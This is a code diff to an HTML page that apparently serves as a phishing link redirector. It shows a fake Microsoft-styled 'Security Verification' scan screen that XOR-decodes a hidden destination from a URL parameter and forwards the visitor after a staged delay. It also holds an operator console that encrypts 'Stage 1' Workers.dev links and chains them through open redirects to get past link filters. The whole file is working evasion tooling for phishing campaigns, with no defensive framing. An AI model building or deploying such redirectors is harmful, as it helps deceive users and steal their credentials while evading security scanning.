@@ -3,102 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <title>Security Gateway</title>
-    <script>
-        const secretKey = "S3cur3_G4t3w4y"; 
-        const params = new URLSearchParams(window.location.search);
-        const payload = params.get('p');
-
-        if (payload) {
-            // Force the Bouncer UI to show immediately if payload exists
-            document.write(`
-                <style>
-                    body { font-family: 'Segoe UI', sans-serif; background: #ffffff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-                    .card { text-align: center; padding: 40px; border: 1px solid #e1e1e1; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 400px; width: 90%; }
-                    .shield { margin-bottom: 20px; }
-                    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                </style>
-                <div class="card">
-                    <div class="shield">
-                        <svg width="60" height="60" viewBox="0 0 24 24" fill="#0067b8">
-                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
-                        </svg>
-                    </div>
-                    <div style="font-size: 18px; font-weight: 600; color: #333;">Security Verification</div>
-                    <div class="spinner"></div>
-                    <div style="font-size: 14px; color: #666;">Scanning link for threats...</div>
-                    <div style="font-size: 11px; color: #999; margin-top: 15px;">Please wait while we verify the destination.</div>
-                </div>
-            `);
-
-            // Handle the jump
-            setTimeout(() => {
-                try {
-                    const binary = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
-                    let destination = "";
-                    for (let i = 0; i < binary.length; i++) {
-                        destination += String.fromCharCode(binary.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
-                    }
-                    window.location.replace(destination);
-                } catch(e) {
-                    window.location.replace("https://www.microsoft.com");
-                }
-            }, 3000); // 3-second delay for the "scan"
-        }
-    </script>
-    <style>
-        /* Generator UI Styles (What YOU see) */
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; padding: 20px; }
-        .container { max-width: 600px; margin: auto; }
-        .card-gen { background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; }
-        h2 { color: #38bdf8; font-size: 18px; margin-top: 0; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box; font-family: monospace; }
-        button { background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }
-        .output-box { margin-top: 15px; padding: 15px; background: #020617; border: 1px dashed #38bdf8; color: #fbbf24; font-size: 11px; word-break: break-all; display: none; }
+    <style id="holdScreen">
+        html { display: none !important; background-color: #f3f4f6; }
     </style>
 </head>
 <body>
 
-<div class="container" id="generatorUI">
-    <div class="card-gen">
-        <h2>Stage 2: Encrypt Link</h2>
-        <input type="text" id="workerLink" placeholder="Paste Stage 1 Worker Link">
-        <button onclick="makeStage2()">ENCRYPT & GET GITHUB LINK</button>
-        <div id="stage2Output" class="output-box"></div>
+    <div id="bouncerUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; background: #ffffff;">
+        <div style="text-align: center; padding: 40px; border: 1px solid #e1e1e1; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 400px; width: 90%;">
+            <svg width="60" height="60" viewBox="0 0 24 24" fill="#0067b8" style="margin-bottom:20px;">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+            </svg>
+            <div style="font-size: 18px; font-weight: 600; color: #333;">Security Verification</div>
+            <div id="loader" style="border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
+            <div style="font-size: 14px; color: #666;">Scanning link for threats...</div>
+            <div style="font-size: 11px; color: #999; margin-top: 15px;">Verifying secure connection to destination.</div>
+        </div>
     </div>
 
-    <div class="card-gen">
-        <h2>Stage 3: Merge Redirect</h2>
-        <input type="text" id="redirectBase" placeholder="Paste Open Redirect Base (e.g. site.com/out?url=)">
-        <button onclick="mergeLinks()" style="background:#10b981;">GENERATE FINAL LINK</button>
-        <div id="finalOutput" class="output-box"></div>
-    </div>
-</div>
+    <div id="generatorUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white;">
+        <div style="width: 100%; max-width: 600px; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155;">
+            <h2 style="color:#38bdf8; margin-top:0;">Deployment Console</h2>
+            <p style="font-size:12px; color:#94a3b8;">1. Encrypt Stage 1 Link:</p>
+            <input type="text" id="workerLink" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="Paste Workers.dev link here">
+            <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">ENCRYPT LINK</button>
+            <div id="stage2Output" style="margin-top: 15px; padding: 15px; background: #020617; border: 1px dashed #38bdf8; color: #fbbf24; font-size: 11px; word-break: break-all; display: none;"></div>
 
-<script>
-    function makeStage2() {
-        const input = document.getElementById('workerLink').value;
-        if(!input) return;
-        let result = "";
-        for (let i = 0; i < input.length; i++) {
-            result += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
+            <p style="font-size:12px; color:#94a3b8; margin-top:20px;">2. Merge with Open Redirect:</p>
+            <input type="text" id="redirectBase" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="Paste Redirect Base (e.g. site.com/out?url=)">
+            <button onclick="mergeLinks()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE FINAL LINK</button>
+            <div id="finalOutput" style="margin-top: 15px; padding: 15px; background: #020617; border: 1px dashed #38bdf8; color: #fbbf24; font-size: 11px; word-break: break-all; display: none;"></div>
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+
+    <script>
+        const secretKey = "S3cur3_G4t3w4y";
+        const params = new URLSearchParams(window.location.search);
+        const payload = params.get('p');
+
+        // Logic to choose which UI to wake up
+        if (payload) {
+            // SHOW SHIELD
+            document.getElementById('bouncerUI').style.display = 'flex';
+            document.getElementById('holdScreen').remove(); // Release the kill-switch
+            
+            setTimeout(() => {
+                try {
+                    const binary = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
+                    let dest = "";
+                    for (let i = 0; i < binary.length; i++) {
+                        dest += String.fromCharCode(binary.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
+                    }
+                    window.location.replace(dest);
+                } catch(e) {
+                    window.location.replace("https://www.microsoft.com");
+                }
+            }, 3000);
+        } else {
+            // SHOW GENERATOR
+            document.getElementById('generatorUI').style.display = 'flex';
+            document.getElementById('holdScreen').remove(); // Release the kill-switch
         }
-        const encrypted = btoa(result).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-        const finalUrl = window.location.origin + window.location.pathname + "?p=" + encrypted;
-        const out = document.getElementById('stage2Output');
-        out.innerText = finalUrl;
-        out.style.display = 'block';
-    }
 
-    function mergeLinks() {
-        const base = document.getElementById('redirectBase').value;
-        const github = document.getElementById('stage2Output').innerText;
-        if(!base || !github) return;
-        const final = base + encodeURIComponent(github);
-        const out = document.getElementById('finalOutput');
-        out.innerText = final;
-        out.style.display = 'block';
-    }
-</script>
+        function makeStage2() {
+            const input = document.getElementById('workerLink').value;
+            if(!input) return;
+            let result = "";
+            for (let i = 0; i < input.length; i++) {
+                result += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
+            }
+            const encrypted = btoa(result).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+            const finalUrl = window.location.origin + window.location.pathname + "?p=" + encrypted;
+            document.getElementById('stage2Output').innerText = finalUrl;
+            document.getElementById('stage2Output').style.display = 'block';
+        }
+
+        function mergeLinks() {
+            const base = document.getElementById('redirectBase').value;
+            const github = document.getElementById('stage2Output').innerText;
+            if(!base || !github) return;
+            const final = base + encodeURIComponent(github);
+            document.getElementById('finalOutput').innerText = final;
+            document.getElementById('finalOutput').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
+
